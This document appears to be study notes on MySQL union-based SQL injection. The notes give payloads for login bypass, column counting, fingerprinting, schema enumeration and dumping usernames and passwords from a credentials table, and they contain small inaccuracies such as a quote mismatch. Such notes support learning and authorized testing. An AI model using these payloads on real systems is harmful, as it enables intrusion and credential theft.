Subverting SQL Query Logic
############################

Authentication Injection
*****************************
Escaping the argument and extending the query
===============================================

Example in the case of a simple login query.

.. code-block:: console

   SELECT username, password from users where username = "" AND password = "";

And by sending the data values as

.. code-block:: console

   admin'-- - 

The ’– - will escape the query and not compare the password.

Determining query result columns
************************************

Using ORDER BY
==================

Using these two SQL actions we can determine how many columns are
returned in the original query. By injecting:

.. code-block:: console

   ' order by 1-- -

This will confirm that there is at least one column returned. Keep
incrementing the integer until there is an error, or blank page.

Using UNION
=================

The same method can be used using UNION as well

.. code-block:: console

   ' UNION SELECT 1,2,3-- -

Keep adding numbers until failure.

Determine location of Injection
**********************************

Results may not be displayed in the starting or same order as the query.
This is why it is useful to use numbers as our junk data (and it avoids
getting the wrong datatype).

A test we can use instead of a number, to see if there is data there is
by using @@version or user()

Fingerprinting
*****************

To determine MySQL there are 3 function that are unique to it:

1. @@VERSION
2. POW(1,1)
3. SLEEP(5) - Will sleep 5 sec, and 0 in all other DB’s

Schema enumeration
*********************

To get all databases on this server use:

.. code-block:: console

   SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

Example: For a query that returns 4 columns, but only displays 2,3,4

.. code-block:: console

   cn' UNION SELECT 1, schema_name, 3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

To get the database that the web container is using use

.. code-block:: console

   cn' UNION SELECT 1, database(),2,3-- -

As this may return other interesting databases - for in this example
‘dev’ we can get the tables from this schema with:

.. code-block:: console

   cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

Say there is a table called ‘credentials’ we can get its structure with:

.. code-block:: console

   cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

Now that we have the column names, we can get the data with:

.. code-block:: console

   cn' UNION select 1, username, password, 4 from dev.credentials-- -

References
***********
